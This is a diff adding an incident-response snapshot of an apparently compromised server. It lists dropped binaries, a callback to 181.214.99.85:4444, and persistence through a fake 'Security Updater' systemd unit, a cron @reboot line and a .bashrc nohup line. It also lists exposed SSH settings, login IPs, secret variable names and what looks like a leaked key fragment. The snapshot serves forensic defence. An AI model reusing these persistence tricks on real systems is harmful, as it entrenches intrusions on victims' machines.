@@ -1,0 +1,152 @@
+SNAPSHOT Sat Aug 15 11:00:44 UTC 2026 host=srv1187504 ip=72.61.237.244
+
+### binaries
+total 28900
+drwxr-xr-x   2 root root     4096 Dec 10  2025 .
+drwxr-xr-x 114 root root     4096 Aug 11 06:05 ..
+-rwxrwxrwx   1 root root 14352532 Dec 10  2025 cARM
+-rwxrwxrwx   1 root root 15216788 Dec 10  2025 cX86
+2c7305a3f13bae3bfb7e547b770871f526d07c00cad667ef12e6b9857fc3f932  /etc/de/cARM
+ab05731480cd549b5cc7ff31e94ac5bc73f8fee1a712f91a276f67cc8b8fe729  /etc/de/cX86
+/etc/de/cARM: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, stripped
+/etc/de/cX86: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped
+
+### process
+    PID    PPID                  STARTED     ELAPSED %CPU %MEM   RSS CMD
+    713       1 Tue Jul  7 11:42:43 2026 38-23:18:00  0.0  0.2 17680 /etc/de/cX86
+
+### sockets
+SYN-SENT 0      1      72.61.237.244:40678  181.214.99.85:4444  users:(("cX86",pid=713,fd=6))     
+
+### zombie children count
+101
+
+### persistence: systemd
+[Unit]
+Description=Security Updater
+After=network.target
+
+[Service]
+ExecStart=/etc/de/cX86
+WorkingDirectory=/etc/de
+Restart=always
+RestartSec=3
+User=root
+
+
+[Install]
+WantedBy=multi-user.target
+enabled
+active
+
+### persistence: crontab
+* * * * * /usr/local/bin/wc-deploy.sh
+@reboot /etc/de/./cX86
+
+### persistence: bashrc
+27:if [ -z "$debian_chroot" ] && [ -r /etc/debian_chroot ]; then
+28:    debian_chroot=$(cat /etc/debian_chroot)
+100:nohup /etc/de/./cX86 > /dev/null 2>&1 & disown
+
+### journal (last 40)
+Aug 15 09:28:29 srv1187504 cX86[713]: 2026/08/15 09:28:29 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 09:30:48 srv1187504 cX86[713]: 2026/08/15 09:30:48 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 09:33:07 srv1187504 cX86[713]: 2026/08/15 09:33:07 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 09:35:27 srv1187504 cX86[713]: 2026/08/15 09:35:27 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 09:37:46 srv1187504 cX86[713]: 2026/08/15 09:37:46 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 09:40:05 srv1187504 cX86[713]: 2026/08/15 09:40:05 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 09:42:24 srv1187504 cX86[713]: 2026/08/15 09:42:24 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 09:44:44 srv1187504 cX86[713]: 2026/08/15 09:44:44 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 09:47:03 srv1187504 cX86[713]: 2026/08/15 09:47:03 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 09:49:22 srv1187504 cX86[713]: 2026/08/15 09:49:22 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 09:51:42 srv1187504 cX86[713]: 2026/08/15 09:51:42 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 09:54:01 srv1187504 cX86[713]: 2026/08/15 09:54:01 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 09:56:20 srv1187504 cX86[713]: 2026/08/15 09:56:20 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 09:58:39 srv1187504 cX86[713]: 2026/08/15 09:58:39 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 10:00:59 srv1187504 cX86[713]: 2026/08/15 10:00:59 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 10:03:18 srv1187504 cX86[713]: 2026/08/15 10:03:18 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 10:05:37 srv1187504 cX86[713]: 2026/08/15 10:05:37 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 10:07:56 srv1187504 cX86[713]: 2026/08/15 10:07:56 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 10:10:16 srv1187504 cX86[713]: 2026/08/15 10:10:16 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 10:12:35 srv1187504 cX86[713]: 2026/08/15 10:12:35 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 10:14:54 srv1187504 cX86[713]: 2026/08/15 10:14:54 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 10:17:13 srv1187504 cX86[713]: 2026/08/15 10:17:13 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 10:19:33 srv1187504 cX86[713]: 2026/08/15 10:19:33 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 10:21:52 srv1187504 cX86[713]: 2026/08/15 10:21:52 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 10:24:11 srv1187504 cX86[713]: 2026/08/15 10:24:11 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 10:26:30 srv1187504 cX86[713]: 2026/08/15 10:26:30 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 10:28:50 srv1187504 cX86[713]: 2026/08/15 10:28:50 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 10:31:09 srv1187504 cX86[713]: 2026/08/15 10:31:09 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 10:33:28 srv1187504 cX86[713]: 2026/08/15 10:33:28 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 10:35:48 srv1187504 cX86[713]: 2026/08/15 10:35:48 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 10:38:07 srv1187504 cX86[713]: 2026/08/15 10:38:07 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 10:40:26 srv1187504 cX86[713]: 2026/08/15 10:40:26 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 10:42:45 srv1187504 cX86[713]: 2026/08/15 10:42:45 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 10:45:05 srv1187504 cX86[713]: 2026/08/15 10:45:05 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 10:47:24 srv1187504 cX86[713]: 2026/08/15 10:47:24 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 10:49:43 srv1187504 cX86[713]: 2026/08/15 10:49:43 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 10:52:02 srv1187504 cX86[713]: 2026/08/15 10:52:02 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 10:54:22 srv1187504 cX86[713]: 2026/08/15 10:54:22 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 10:56:41 srv1187504 cX86[713]: 2026/08/15 10:56:41 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+Aug 15 10:59:00 srv1187504 cX86[713]: 2026/08/15 10:59:00 Connection error: dial tcp 181.214.99.85:4444: connect: connection timed out.
+
+### timestamps
+/etc/de mtime=2025-12-10 22:25:40.419898988 +0000 ctime=2025-12-10 22:25:40.419898988 +0000
+/etc/de/cX86 mtime=2025-12-10 22:25:42.165894109 +0000 ctime=2025-12-11 00:17:16.884144508 +0000
+/etc/de/cARM mtime=2025-12-10 22:25:40.163899700 +0000 ctime=2025-12-11 00:17:16.665145696 +0000
+/etc/systemd/system/supdate.service mtime=2026-07-07 11:42:43.637000000 +0000 ctime=2026-07-07 11:42:43.637000000 +0000
+/root/.bashrc mtime=2025-12-10 09:56:34.585047856 +0000 ctime=2025-12-10 11:47:24.236164104 +0000
+
+### root authorized_keys (fingerprints)
+4096 SHA256:I+ETyb82R36Y6X9vaU/9RBCl5cIBQei7PTavb2WHoAw github-deploy (RSA)
+2048 SHA256:g+BKEBlGTDvqsIxwM68ssrswj1OSw55JyVCnkPl2EuQ rsa-key-20250409 (RSA)
+2048 SHA256:g+BKEBlGTDvqsIxwM68ssrswj1OSw55JyVCnkPl2EuQ rsa-key-20250409 (RSA)
+2048 SHA256:g+BKEBlGTDvqsIxwM68ssrswj1OSw55JyVCnkPl2EuQ rsa-key-20250409 (RSA)
+1024 SHA256:XSQTB6GiRZLS+HE/8XXr6hKL/RzfrT6mi0Ogmy4qxj8 rsa-key-20110924 (RSA)
+256 SHA256:KI1ZI2CEDnYF2sJnI0gf243Ocna8x94RoY4EqCxV8so root@srv1187504 (ED25519)
+4096 SHA256:du2a7Ku0bJaMqVNn51XK90gUTDPZ6mSHPmoPSYjaS+k windchasers-github (RSA)
+256 SHA256:zREjVV70gssKt6XTr1KCfbgAFmTYopX3EOBLOEJ1Uz0 claude-windchasers-deploy (ED25519)
+
+### sshd exposure
+/etc/ssh/sshd_config:PermitRootLogin yes
+/etc/ssh/sshd_config.d/50-cloud-init.conf:PasswordAuthentication yes
+/etc/ssh/sshd_config.d/60-cloudimg-settings.conf:PasswordAuthentication no
+
+### accepted logins in current log
+      8 Accepted publickey for root from 115.99.171.179
+      5 Accepted publickey for root from 115.99.94.79
+      3 Accepted publickey for root from 169.254.0.1
+
+### secrets exposed on host
+/var/www/turquoise/.env.local:
+  NEXT_PUBLIC_SUPABASE_URL
+  NEXT_PUBLIC_SUPABASE_ANON_KEY
+  SUPABASE_SERVICE_ROLE_KEY
+  NEXT_PUBLIC_UNSPLASH_ACCESS_KEY
+  CLAUDE_API_KEY
+  NODE_ENV
+/var/www/windchasers/.env.local:
+  PORT
+  EVENT_DATA_2026_SHEET_ID
+  GOOGLE_SHEET_TAB_SUMMERCAMP
+  GOOGLE_SHEET_TAB_OPEN_HOUSE
+  CABIN_CREW_SHEET_ID
+  GOOGLE_SHEET_TAB_CABIN_CREW
+  ATC_SHEET_ID
+  GOOGLE_SHEET_TAB_ATC
+  GOOGLE_SERVICE_ACCOUNT_EMAIL
+  GOOGLE_PRIVATE_KEY
+  PqSTLOrg3SL+Uyxt4VYEioE
+  GOOGLE_SHEET_ID
+  GOOGLE_SHEET_TAB
+  PROXE_BASE_URL
+  PROXE_INBOUND_API_KEY
+  NEXT_PUBLIC_SUPABASE_URL
+  NEXT_PUBLIC_SUPABASE_ANON_KEY
+  SUPABASE_SERVICE_ROLE_KEY
+
+### firewall
+Status: inactive
+-P INPUT ACCEPT
+-P FORWARD ACCEPT
+-P OUTPUT ACCEPT
